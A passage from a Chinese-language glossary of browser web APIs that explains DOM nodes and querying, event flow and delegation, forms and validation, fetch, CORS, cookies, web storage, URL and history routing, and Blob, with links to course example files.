**节点（Node）**是 DOM 树的通用单位，共有十几种类型：元素节点、文本节点、注释节点、`document` 节点、`DocumentFragment` 等；**元素（Element）**是其中最常用的一类（类型码 1），代表一个标签，因此拥有 `id`/`className`/`classList`/`style`/`innerHTML`/`attributes` 这些只有元素才有的成员。关键细节：`nodeType`/`nodeName` 可以判断类型（1 = 元素、3 = 文本、8 = 注释、9 = 文档），`instanceof Element` 更直观；很多 DOM API 返回的是 Node（如 `firstChild`），在它上面调用 `classList` 会报错。**常见误解**：以为「元素」和「节点」可以互换——`document.body.childNodes[0]` 往往是空白文本节点，而不是元素。

也见 [DOM Tree（DOM 树）](#dom-treedom-树)、[DOM（文档对象模型）](#dom文档对象模型)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### Selector & querySelector / querySelectorAll（选择器与 DOM 查询）

选择器是用字符串描述「要匹配哪些元素」的语法，与 CSS 选择器完全一致：类型 `div`、类 `.card`、ID `#main`、属性 `[data-id="1"]`、伪类 `:checked`/`:nth-child(2)`、组合 `ul > li + li`、组 `h1, h2`。`document.querySelector(sel)` 返回**第一个**匹配的元素（没有则 `null`），`querySelectorAll(sel)` 返回**静态的 `NodeList`**（没有则空集合），两者都接受任意 CSS 选择器，因此不必再写复杂的遍历。关键细节：**它是从调用者开始向下搜索的**——`el.querySelector('div')` 只在 `el` 的后代里找，不包括 `el` 自己；`NodeList` 不是数组，要遍历可用 `for...of` 或 `Array.from`。

也见 [DOM Tree（DOM 树）](#dom-treedom-树)、[Event Delegation（事件委托）](#event-delegation事件委托)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)、[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)

### DOM Manipulation & DocumentFragment（DOM 操作与文档片段）

DOM 操作指对树的增删改：创建 `document.createElement('li')` / `createTextNode`、插入 `append`/`prepend`/`before`/`after`/`insertBefore`、替换 `replaceWith`/`replaceChildren`、删除 `remove`/`removeChild`、改属性 `setAttribute`/`classList.add`/`dataset`、改内容 `textContent`（安全、纯文本）与 `innerHTML`（会解析 HTML，**有 XSS 风险**）。**`DocumentFragment`** 是一个「不在页面上的游离容器」，可以把多个新节点先挂到它上面，最后一次插入文档。关键细节：每次插入都可能触发样式与布局重算，所以「**先离屏拼装、再一次性插入**」比循环逐个 `append` 快得多；`textContent` 应作为写文本的默认选择。

也见 [DOM（文档对象模型）](#dom文档对象模型)、[Node & Element（节点与元素）](#node-element节点与元素)。

示例：[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)、[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### Event & Event Listener（事件与事件监听器）

事件是浏览器通知「有事情发生了」的机制：用户点击（`click`）、键盘（`keydown`）、指针移动（`pointermove`）、资源加载（`load`）、网络请求完成（`fetch` 的 Promise 也算一种）、消息到达（`message`）……**事件监听器**是一个注册到某个元素与事件类型上的回调，用 `target.addEventListener(type, handler, options)` 登记。关键细节：第三个参数可以是 `{ once: true }`（只触发一次）、`{ capture: true }`（在捕获阶段触发）、`{ passive: true }`（承诺不调用 `preventDefault`，滚动性能更好）；**同一个函数引用重复注册会被去重**，但匿名箭头函数每次都是新的，会导致重复绑定与内存泄漏。

也见 [Event Object（事件对象）](#event-object事件对象)、[Event Flow（事件流三阶段）](#event-flow事件流三阶段)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)、[`27_web_apis/02_dom_events.html`](27_web_apis/02_dom_events.html)

### Event Object（事件对象）

事件对象是浏览器传给监听器的**第一个参数**，承载这次事件的全部信息与能力。常用成员：`type`（事件类型）、`target`（最初触发的元素，不随冒泡改变）、`currentTarget`（当前正在执行监听器的元素，即绑定者）、`eventPhase`（1 捕获 / 2 目标 / 3 冒泡）、坐标（`clientX`/`clientY`、`pageX`/`pageY`）、`timeStamp`、`isTrusted`，以及方法 `preventDefault()`、`stopPropagation()`、`stopImmediatePropagation()`。关键细节：**`target` 与 `currentTarget` 的区别是理解事件流的钥匙**——委托就靠前者判断该处理谁；另外事件对象是**复用**的（尤其是在旧实现与 React 合成事件中），需要异步使用时要用 `event.persist()` 或提前取出用到的值。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Event Delegation（事件委托）](#event-delegation事件委托)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Event Flow（事件流三阶段）

一次事件的传播分为三个阶段：**捕获阶段（capturing）**从 `window`/`document` 一路向下传到目标元素的父节点；**目标阶段（target）**在目标元素自身上执行监听器；**冒泡阶段（bubbling）**再从目标向上逐层传回 `window`。监听器默认注册在冒泡阶段，传 `{ capture: true }` 才是捕获阶段。关键细节：`dispatchEvent` 会先算出这条**传播路径**再依次执行；同一元素上同时有捕获与冒泡监听器时，捕获先于冒泡（在目标元素上的顺序按注册顺序）；事件流是**跨影子边界**可组合的（`composed` 决定能否穿出 Shadow DOM）。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Capturing（事件捕获）](#capturing事件捕获)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Bubbling（事件冒泡）

事件冒泡指事件在目标元素上处理完后，**继续沿父链向上传播**，父元素的监听器也会被触发，直至 `document`/`window`。它是事件委托的基础：把监听器挂在父容器上，就能统一处理所有子元素的同类事件。关键细节：**不是所有事件都冒泡**——`focus`/`blur`（但其委托版 `focusin`/`focusout` 会冒泡）、`mouseenter`/`mouseleave`、`load` 等不冒泡；`stopPropagation()` 可以打断冒泡，但会破坏依赖冒泡的委托逻辑。**常见误解**：以为「子元素被点了所以父元素也『算被点』」——冒泡只是事件传播，父元素的监听器触发时 `event.target` 仍然是真正被点的子元素。

也见 [Capturing（事件捕获）](#capturing事件捕获)、[Event Delegation（事件委托）](#event-delegation事件委托)、[Event Flow（事件流三阶段）](#event-flow事件流三阶段)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Capturing（事件捕获）

捕获阶段是事件流的**前半程**：事件从 `window` 向下传递到目标的父节点，途中所有在捕获阶段注册的监听器（`addEventListener(type, fn, true)` 或 `{ capture: true }`）会先被调用。它的实用价值在于**能在目标之前拦截事件**——例如在容器上捕获所有点击做全局埋点、或在事件到达目标前统一做权限/条件过滤。关键细节：捕获阶段只覆盖「目标的**祖先**」，目标元素自身的监听器在目标阶段执行（除非显式注册为捕获，此时它在目标阶段也参与，顺序仍按注册先后）；`{ once: true, capture: true }` 是常见组合。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Event Flow（事件流三阶段）](#event-flow事件流三阶段)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Event Delegation（事件委托）

事件委托利用冒泡，把**一个监听器挂在共同的父容器上**，通过 `event.target`（或 `target.closest(selector)`）判断实际点的是哪个子元素，从而避免给每个子元素单独绑定。它解决三个问题：动态新增的元素**自动生效**（无需重新绑定）、监听器数量从 N 降到 1（内存与性能都更好）、逻辑集中便于维护。关键细节：`closest` 是判断的好帮手，因为它会把「点在子元素内部」也算作命中；要注意子元素自己调用了 `stopPropagation` 时会破坏委托；还要避开不冒泡的事件（见冒泡条目）。**常见误解**：以为委托只适合列表——任何有共同祖先的重复元素都适用，包括表格行、菜单项、卡片。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Event Object（事件对象）](#event-object事件对象)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)、[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)

### preventDefault（阻止默认行为）

`preventDefault()` 取消**浏览器对该事件的默认动作**：点击链接不跳转、提交表单不刷新页面、右键不弹出菜单、拖放不执行默认打开、`wheel` 不滚动、键盘输入不落进输入框。它**不影响事件传播**——事件照样冒泡，父元素的监听器照样执行。关键细节：只有当事件的 `cancelable` 属性为 `true` 时才能生效，且必须**在监听器里同步调用**（`await` 之后往往已经太晚）；`dispatchEvent` 的返回值就是「是否未被取消」，可用来判断默认行为有没有被拦下。**常见误解**：把 `preventDefault` 与 `stopPropagation` 混为一谈——前者管「浏览器接下来做什么」，后者管「事件还要不要往上走」。

也见 [stopPropagation（阻止事件传播）](#stoppropagation阻止事件传播)、[Form Validation & setCustomValidity（表单校验与自定义校验消息）](#form-validation-setcustomvalidity表单校验与自定义校验消息)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)、[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)

### stopPropagation（阻止事件传播）

`stopPropagation()` 让事件**不再继续沿传播路径前进**：在冒泡阶段调用，祖先元素的监听器就不会再被触发；在捕获阶段调用，事件根本到不了目标。它的兄弟 `stopImmediatePropagation()` 更彻底——连**同一元素上注册在后面的其它监听器**也一并跳过。关键细节：它常常是「为了省事」而被滥用，副作用是**破坏事件委托**、让埋点/统计/框架的全局监听器失灵，排查起来非常痛苦。**常见误解**：以为它会阻止浏览器默认行为——它不会，那需要 `preventDefault()`；两者正交，必要时同时调用。

也见 [preventDefault（阻止默认行为）](#preventdefault阻止默认行为)、[Bubbling（事件冒泡）](#bubbling事件冒泡)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### CustomEvent（自定义事件）

`CustomEvent` 是可以用 `new CustomEvent(type, { detail, bubbles, cancelable })` 自行构造并 `dispatchEvent` 派发的事件类型，`detail` 可以携带任意（结构化克隆兼容的）数据。它让**组件与组件之间通过事件通信**而不是互相直接调用：子组件派发 `'item-selected'`，外层在容器上监听即可。关键细节：**必须显式设置 `bubbles: true`**，否则事件不会离开目标元素，父容器的委托监听收不到——这是自定义事件最常踩的坑；`detail` 里传对象时是引用（同页面内），跨上下文则会走结构化克隆。普通 `Event`（无 `detail`）适合「通知发生了一件事」，`CustomEvent` 适合「通知并带数据」。

也见 [Event & Event Listener（事件与事件监听器）](#event-event-listener事件与事件监听器)、[Publish/Subscribe（发布订阅）](#publishsubscribe发布订阅)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Form（表单）

表单（`<form>`）是网页收集用户输入的标准方式，控件包括 `<input>`（`type` 可取 `text`/`email`/`number`/`checkbox`/`radio`/`file`/`date`…）、`<select>`、`<textarea>`、`<button>`。核心行为：提交时浏览器会**收集所有带 `name` 的控件**并按 `method`（GET 拼进查询串、POST 放进请求体）与 `action` 发送，然后**整页跳转**；因此现代做法是监听 `submit` 事件并 `preventDefault()`，改用 `fetch` 提交。关键细节：控件的值通过 `form.elements` 或 `FormData` 读取；`method="dialog"` 与 `<button type="button">` 是「不要提交」的常见写法；表单还能利用原生能力（自动填充、校验、移动端键盘类型）。

也见 [Form Validation & setCustomValidity（表单校验与自定义校验消息）](#form-validation-setcustomvalidity表单校验与自定义校验消息)、[FormData（表单数据）](#formdata表单数据)。

示例：[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)、[`27_web_apis/03_forms_and_validation.html`](27_web_apis/03_forms_and_validation.html)

### Form Validation & setCustomValidity（表单校验与自定义校验消息）

表单校验分两层：**原生校验**由 HTML 属性声明（`required`、`type="email"`、`minlength`/`maxlength`、`min`/`max`、`pattern`），浏览器在提交时自动阻止非法表单并显示提示气泡；**自定义校验**用 Constraint Validation API——`input.setCustomValidity('消息')` 设定自定义错误（传空字符串表示「合法」）、`input.checkValidity()`/`form.checkValidity()` 立即求值、`input.validity` 对象给出 `valueMissing`/`typeMismatch`/`patternMismatch`/`tooShort` 等具体原因。关键细节：设置过自定义消息后**必须在校验通过时把它清空**，否则该字段会永远非法；原生校验只是**用户体验的第一道防线**，服务端必须重复校验（前端校验可被绕过）。

也见 [Form（表单）](#form表单)、[preventDefault（阻止默认行为）](#preventdefault阻止默认行为)。

示例：[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)

### FormData（表单数据）

`FormData` 是「键 → 值」的表单数据容器，两种来源：`new FormData(formElement)` 自动抓取表单里所有带 `name` 的控件，或手动 `append`/`set`/`delete`/`get`/`has`。它的最大价值是**直接喂给 `fetch` 作为请求体**——设置好 `body: formData` 后，浏览器会自动使用 `multipart/form-data` 编码并生成 boundary，因此**文件上传几乎不需要手写编码逻辑**（`<input type="file">` 的 `File` 对象可直接 append）。关键细节：此时**不要手动设置 `Content-Type`**，否则会丢掉 boundary 导致服务端解析失败；同名键会形成多值，用 `getAll` 读取；它也是可迭代的（`for (const [k, v] of fd)`）。

也见 [File & FileReader（文件对象与文件读取器）](#file-filereader文件对象与文件读取器)、[fetch（Fetch API）](#fetchfetch-api)。

示例：[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)、[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)

### fetch（Fetch API）

`fetch` 是现代浏览器（与 Node 18+）提供的网络请求 API，基于 Promise，取代了 `XMLHttpRequest`。基本形态是 `const res = await fetch(url, { method, headers, body, signal })`，返回的是 `Response` 对象，还要再调用 `res.json()`/`res.text()`/`res.blob()` 才能读出正文。关键细节：**只有在网络层失败时才 reject**——HTTP 404/500 都算「成功返回」，必须自己检查 `res.ok`（`status` 在 200–299）；请求可被 `AbortController` 取消（传 `signal`）；`fetch` 受**同源策略与 CORS** 约束，且默认**不发送 Cookie**（需 `credentials: 'include'`）。**常见误解**：以为 `await fetch` 就拿到了数据——拿到的是响应头已到达的 `Response`，正文还是流。

也见 [Request & Response（请求与响应对象）](#request-response请求与响应对象)、[CORS（跨域资源共享）](#cors跨域资源共享)、[Status Code & Headers（状态码与请求/响应头）](#status-code-headers状态码与请求响应头)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)、[`27_web_apis/04_fetch_api.html`](27_web_apis/04_fetch_api.html)

### Request & Response（请求与响应对象）

`Request` 描述一次请求（URL、方法、头、体、模式、凭据策略），`Response` 描述一次响应（状态、头、体），两者都来自 Fetch 标准，且可以自由构造：`new Request(url, init)` 适合把请求配置**复用/预构造**（还能传给 Service Worker 缓存），`new Response(body, { status, headers })` 适合在 Service Worker 或测试里造出响应。关键细节：**正文是一次性流**——`res.json()` 读过之后就不能再读，需要多份时先用 `res.clone()`；`res.body` 是可读流，可用于进度或流式处理。**常见误解**：以为 `Request`/`Response` 只是类型名字——它们是真正的类，构造出来就能用在实际请求与拦截逻辑里。

也见 [fetch（Fetch API）](#fetchfetch-api)、[Blob（二进制大对象）](#blob二进制大对象)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)、[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)

### Status Code & Headers（状态码与请求/响应头）

**状态码**是服务器对请求结果的分类：1xx 信息（101 切换协议）、2xx 成功（200、201 创建、204 无内容）、3xx 重定向（301 永久、302/307 临时、304 未修改）、4xx 客户端错误（400 参数错、401 未认证、403 无权、404 不存在、429 太频繁）、5xx 服务端错误（500、502、503）。**Headers** 是键值元数据，请求头如 `Content-Type`、`Authorization`、`Accept`、`Cookie`、`Origin`，响应头如 `Content-Type`、`Cache-Control`、`Set-Cookie`、`Access-Control-Allow-Origin`、`Location`。关键细节：**HTTP 头不区分大小写**，`Headers` 对象提供 `get`/`set`/`has`/`append` 并会自动归一化；有些头是「禁止修改」的（由浏览器控制）；`Content-Type` 决定服务端与 `res.json()` 如何解析正文。**常见误解**：把 `fetch` 的状态码当成错误信号——非 2xx 不会 reject。

也见 [fetch（Fetch API）](#fetchfetch-api)、[CORS（跨域资源共享）](#cors跨域资源共享)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)

### Same-Origin Policy & Cross-Origin（同源策略与跨域）

**源（origin）**由「协议 + 域名 + 端口」三者组成，三者全同才算同源。**同源策略**是浏览器最重要的安全边界：不同源的脚本**不能读取对方的 DOM、不能读取对方 `fetch`/XHR 的响应内容、不能共享 localStorage/Cookie/IndexedDB**，它防的是「恶意站点借用户身份读取其它站点的数据」。**跨域**就是不同源之间的请求，它并没有被禁止（请求可以发出去），被限制的是**读取响应**。关键细节：`file://` 页面、`http` 与 `https`、`example.com` 与 `www.example.com`、`localhost:3000` 与 `:5173` 都算不同的源。**常见误解**：以为跨域是服务器的限制——它是**浏览器**施加的，因此 Postman/curl/Node 脚本不受影响。

也见 [CORS（跨域资源共享）](#cors跨域资源共享)、[Preflight Request（预检请求）](#preflight-request预检请求)、[Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)。

示例：[`27_web_apis/08_browser_modules.js`](27_web_apis/08_browser_modules.js)、[`32_security_and_best_practices/12_cors_and_same_origin.js`](32_security_and_best_practices/12_cors_and_same_origin.js)

### CORS（跨域资源共享）

CORS（Cross-Origin Resource Sharing，跨域资源共享）是**服务器授权浏览器放宽同源策略**的机制：服务端在响应里返回 `Access-Control-Allow-Origin`（可以是 `*` 或具体来源）等头，浏览器看到后才把响应交给 JS。常用的响应头还有 `Access-Control-Allow-Methods`、`Access-Control-Allow-Headers`、`Access-Control-Allow-Credentials`、`Access-Control-Max-Age`。关键细节：**这是浏览器的检查，不是服务器的拦截**——请求其实已经到达服务器并可能已经产生副作用，所以「靠 CORS 保护接口」是错的（要鉴权）；带 Cookie 的跨域请求不允许 `Allow-Origin: *`，必须回显具体来源。**常见误解**：以为配置了 CORS 服务器却没返回头也算通过——证书不对浏览器一律拒绝交给 JS。

也见 [Same-Origin Policy & Cross-Origin（同源策略与跨域）](#same-origin-policy-cross-origin同源策略与跨域)、[Preflight Request（预检请求）](#preflight-request预检请求)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)、[`32_security_and_best_practices/12_cors_and_same_origin.js`](32_security_and_best_practices/12_cors_and_same_origin.js)

### Preflight Request（预检请求）

预检是浏览器在发出**「非简单请求」**之前先用 `OPTIONS` 方法问一句「我能这么请求吗」的过程，服务器必须用 `Access-Control-Allow-*` 头答复，通过后浏览器才发真正的请求（`Access-Control-Max-Age` 可缓存结果，避免每次都问）。触发条件是：方法不是 `GET`/`HEAD`/`POST`，或 `Content-Type` 不是 `application/x-www-form-urlencoded`/`multipart/form-data`/`text/plain`（例如 `application/json`），或带了自定义请求头（如 `Authorization`）。关键细节：预检是**额外的一次往返**，会明显增加延迟，所以高频接口要考虑降级为简单请求或缓存 Max-Age；预检请求不带 Cookie 与正文。**常见误解**：以为「服务器没写 OPTIONS 路由就没事」——没正确响应预检，真实请求根本不会发出去。

也见 [CORS（跨域资源共享）](#cors跨域资源共享)、[Status Code & Headers（状态码与请求/响应头）](#status-code-headers状态码与请求响应头)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)

### XMLHttpRequest（历史 API）

`XMLHttpRequest`（XHR）是 `fetch` 之前的标准网络请求 API：`open(method, url)` → 设置 `onload`/`onerror`/`onprogress` → `send(body)`，通过 `readyState`（0–4）与 `status` 判断结果。它今天仍有三个不可替代的用途：**上传进度**（`upload.onprogress`）、**请求进度**（`onprogress`）以及**同步请求**（已废弃，会冻结页面，绝不要用）。与 `fetch` 的关键差异：XHR 是事件式而非 Promise 式；**非 2xx 也会触发 `onload`**（要在里面判断 `status`）；**跨域时默认不带 Cookie**（`withCredentials = true` 才带）；`fetch` 的 `Response.body` 是流而 XHR 需要 `responseType = 'blob'`/`'arraybuffer'` 之类。**常见误解**：以为 XHR 只用于老浏览器——上传进度条目前仍主要靠它。

也见 [fetch（Fetch API）](#fetchfetch-api)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)

### Cookie（Cookie）

Cookie 是服务器通过 `Set-Cookie` 响应头写在浏览器上的一小段键值数据（单个约 4KB），之后**同源的每个请求都会自动带上它**（`Cookie` 请求头），因此成为会话身份（Session ID）的标准载体。关键属性：`Expires`/`Max-Age`（不设则是会话 Cookie，关浏览器即失效）、`Domain`/`Path`（可见范围）、`Secure`（只在 HTTPS 发送）、`HttpOnly`（**JS 读不到**，防 XSS 窃取）、`SameSite`（`Strict`/`Lax`/`None`，防 CSRF）。关键细节：JS 只能通过 `document.cookie` 读写**非 HttpOnly** 的 Cookie，且 API 是拼接字符串的原始形式，非常别扭。**常见误解**：把 Cookie 当作存储方案——它每次请求都会上传，**只适合放会话标识等小数据**，大量数据应使用 Web Storage 或 IndexedDB。

也见 [localStorage（本地存储）](#localstorage本地存储)、[sessionStorage（会话存储）](#sessionstorage会话存储)、[IndexedDB（索引数据库）](#indexeddb索引数据库)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)

### localStorage（本地存储）

`localStorage` 是同步的键值存储，**按源隔离、永久保存**（除非用户或代码清理），同一源下的所有标签页与窗口共享同一份数据。API 极简：`setItem`/`getItem`/`removeItem`/`clear`/`key`/`length`，通过 `localStorage.key` 与 `getItem()` 访问，只能存**字符串**（对象要先 `JSON.stringify`）。关键细节：**同步 API 会阻塞主线程**，大对象读写会造成掉帧，因此不要存放大量数据；某个标签页的修改会触发**其它**标签页的 `storage` 事件（当前页不触发），可用于跨标签页同步状态。**常见误解**：以为「永久」等于「可靠」——用户清缓存、隐私模式、磁盘紧张时都可能被清掉，重要数据必须以服务器为准。

也见 [sessionStorage（会话存储）](#sessionstorage会话存储)、[Cookie（Cookie）](#cookiecookie)、[IndexedDB（索引数据库）](#indexeddb索引数据库)、[storage Event（storage 事件）](#storage-eventstorage-事件)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)、[`27_web_apis/05_web_storage.html`](27_web_apis/05_web_storage.html)

### sessionStorage（会话存储）

`sessionStorage` 的 API 与 `localStorage` 完全一样，差别只在**生命周期与作用范围**：数据只在**当前标签页/窗口的会话**内有效，关闭标签页即清除，并且**不跨标签页共享**（在新标签页打开同源页面会得到一份新的空存储，即使是从同一链接跳转）。关键细节：同标签页内刷新、前进后退会保留；iframe 有自己的会话存储；「复制标签页」会复制一份存储快照但从此各自独立。适用场景是**一次会话内的临时状态**：表单草稿、向导当前步骤、列表滚动位置、一次性提示是否已展示。**常见误解**：以为它和 `localStorage` 只差一个「过期时间」——作用域（每个标签页独立）往往才是它真正的价值。

也见 [localStorage（本地存储）](#localstorage本地存储)、[Cookie（Cookie）](#cookiecookie)。

示例：[`27_web_apis/05_web_storage.js`](27_web_apis/05_web_storage.js)

### IndexedDB（索引数据库）

IndexedDB 是浏览器内置的**事务型 NoSQL 数据库**，用于存放大量结构化数据（配额通常以「磁盘可用空间的百分比」计，远大于 localStorage），支持索引、游标、事务与二进制数据（可直接存 `Blob`/`ArrayBuffer`）。它的 API 是**异步事件式**的：`indexedDB.open()` → `onsuccess` 拿到数据库 → `transaction()` 开启事务 → `objectStore.put/get/openCursor` 等；现代项目通常用 Promise 包装库（如 idb）或 ORM 简化。关键细节：它按**源 + 数据库名 + 版本**隔离，升级要靠 `onupgradeneeded` 里建表与迁移；版本号是正整数，改 schema 必须升版本。**常见误解**：以为它是「大号 localStorage」——它异步、可索引、有事务，API 复杂得多，简单键值场景反而 localStorage 更省事。

也见 [localStorage（本地存储）](#localstorage本地存储)、[Quota & QuotaExceededError（配额与超限错误）](#quota-quotaexceedederror配额与超限错误)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)、[`27_web_apis/10_browser_storage_limits.html`](27_web_apis/10_browser_storage_limits.html)

### Cache Storage（缓存存储）

Cache Storage 是 `caches` 全局对象背后的存储：以「缓存名 → Request/Response 键值对」的形式保存**网络响应**，专为 Service Worker 的离线能力设计。常用方法：`caches.open(name)`、`cache.put(request, response)`、`cache.add`/`addAll`、`cache.match`/`matchAll`、`caches.delete`。关键细节：它**只在安全上下文可用**，且**只能在 Service Worker（或页面脚本配合 SW）里发挥完整作用**；它与 HTTP 缓存相互独立，浏览器调试工具的 Application 面板可以查看与清理；因为存的是 `Response` 对象，所以是**二进制友好**的，能缓存图片、字体、大文件。**常见误解**：以为 `Cache-Control` 头能限制它——Cache Storage 条目的生命周期由你的 SW 代码控制，与 HTTP 缓存策略无关。

也见 [Service Worker（服务工作线程）](#service-worker服务工作线程)、[Request & Response（请求与响应对象）](#request-response请求与响应对象)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)

### Quota & QuotaExceededError（配额与超限错误）

**配额（quota）**是浏览器允许某个源使用的存储上限，不同存储的算法与量级差别很大：Cookie 约 4KB/条且总数有限；localStorage/sessionStorage 通常每源 5–10MB；IndexedDB 与 Cache Storage 按**整个源**算，可达磁盘可用空间的很大比例（各浏览器不同，通常几十 MB 到数 GB）。超限时写入会抛出 **`QuotaExceededError`**（`DOMException`，`name === 'QuotaExceededError'`，也可能是 `NS_ERROR_DOM_QUOTA_REACHED`）。关键细节：**必须 `try/catch` 处理**，否则一次写入失败就可能中断整个流程；配额还可能被**同一源的所有标签页、IndexedDB、Cache 共同占用**。**常见误解**：以为「存进去了就一直在」——浏览器在磁盘紧张时会整体清除某个源的数据（除非申请了持久化）。

也见 [Persistent Storage（持久化存储）](#persistent-storage持久化存储)、[localStorage（本地存储）](#localstorage本地存储)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)

### Persistent Storage（持久化存储）

默认情况下，浏览器把某个源的存储视为「**best-effort（尽力而为）**」：磁盘紧张、长期未访问、隐私设置都可能把它整体清掉。**持久化存储**通过 `navigator.storage.persist()` 申请把该源提升为「persistent」，成功后浏览器承诺**只在用户主动清理时**才删除数据；`navigator.storage.persisted()` 查询当前状态，`navigator.storage.estimate()` 可以查看 `usage`（已用）与 `quota`（上限）。关键细节：授权通常在无用户手势时直接拒绝或静默批准（取决于浏览器与站点「参与度」），因此要在合适的时机申请并处理失败的降级路径。**常见误解**：以为 `persist()` 能提升配额——它改变的是「会不会被自动清除」，不是「能存多少」；而且**任何本地存储都不该是数据的唯一副本**。

也见 [Quota & QuotaExceededError（配额与超限错误）](#quota-quotaexceedederror配额与超限错误)、[Secure Context & file://（安全上下文与 file 协议限制）](#secure-context-file安全上下文与-file-协议限制)。

示例：[`27_web_apis/10_browser_storage_limits.js`](27_web_apis/10_browser_storage_limits.js)

### URL & URLSearchParams（URL 与查询参数）

`URL` 对象把地址拆成可读写的部件：`protocol`、`host`（含端口）、`hostname`、`port`、`pathname`、`search`、`hash`、`origin`（只读）、`username`/`password`，并**自动做百分号编码**；`URLSearchParams` 则把查询串当成可增删改查的键值集合（`get`/`getAll`/`append`/`set`/`delete`/`has`/`sort`，可迭代）。关键细节：`new URL(relative, base)` 支持相对路径解析；**永远不要用字符串拼查询参数**，中文、空格、`&`、`=` 都会出错；`url.searchParams.set('page', 2)` 会正确处理编码，还能用 `url.href` 拿回完整地址。这是**浏览器与 Node 共用的 WHATWG 标准**，写同构代码时行为一致。

也见 [node:url & URLSearchParams（URL 模块与查询参数）](#nodeurl-urlsearchparamsurl-模块与查询参数)、[history API（历史记录 API）](#history-api历史记录-api)。

示例：[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)、[`27_web_apis/06_url_and_history.html`](27_web_apis/06_url_and_history.html)

### history API（历史记录 API）

`history` 对象让脚本**在不刷新页面的前提下改变地址栏**：`pushState(state, '', url)` 新增一条历史记录，`replaceState` 替换当前记录，`back()`/`forward()`/`go(n)` 导航，`history.state` 读回当前记录携带的数据，`history.length` 是会话历史条目数。它支撑了现代前端路由（「pushState 路由」）。关键细节：`state` 会被**结构化克隆**（不能放函数/DOM 节点）；`pushState` **不会触发任何事件**，需要在调用处主动渲染，而用户点后退会触发 `popstate`（此时 `event.state` 有值）；用 `pushState` 造出的路径**刷新时会真的去服务器请求它**，所以服务端必须把所有前端路由都返回同一个 HTML，否则 404——这是与 hash 路由最大的工程差别。

也见 [Hash Routing（hash 路由）](#hash-routinghash-路由)、[URL & URLSearchParams（URL 与查询参数）](#url-urlsearchparamsurl-与查询参数)。

示例：[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)、[`27_web_apis/06_url_and_history.html`](27_web_apis/06_url_and_history.html)

### Hash Routing（hash 路由）

Hash 路由利用 URL 中 `#` 之后的部分（fragment）做前端路由：`location.hash` 变化时**不会向服务器发请求**，只触发 `hashchange` 事件，脚本据此切换视图。它的最大优点是**不需要服务器配合**——把 `index.html` 直接放静态服务器（甚至本地文件）也能正常工作，因此常见于文档站与旧式 SPA。关键细节：hash 在请求时不会发给服务器，所以**服务端拿不到路由信息**（不利于 SEO 与服务端渲染）；`#` 的内容也不参与同源判断；现代框架多默认使用 History 路由，需要服务端做 fallback 配置。**常见误解**：以为 `#` 只是「锚点」——它同样是路由状态，`location.hash = '#/users/1'` 与点击链接效果一致。

也见 [history API（历史记录 API）](#history-api历史记录-api)、[URL & URLSearchParams（URL 与查询参数）](#url-urlsearchparamsurl-与查询参数)。

示例：[`27_web_apis/06_url_and_history.js`](27_web_apis/06_url_and_history.js)

### Blob（二进制大对象）

`Blob`（Binary Large Object）表示一块**不可变的二进制数据 + MIME 类型**：`new Blob(parts, { type: 'text/plain' })`，其中 `parts` 可以是字符串、`ArrayBuffer`、TypedArray 或其它 Blob 的混合数组。它有 `size`、`type`、`slice()`（切片，可用于分片上传）、`text()`/`arrayBuffer()`/`stream()` 等读取方法。关键细节：Blob 的数据由浏览器管理（可能落在磁盘而不占 JS 堆），因此适合承载大文件；`fetch` 的响应可以用 `res.blob()` 拿到；表单与 `FormData`、`createObjectURL`、Canvas 导出都围绕它工作。**常见误解**：以为 Blob 可以像字符串一样直接读取——它是异步的，必须 `await blob.text()`。

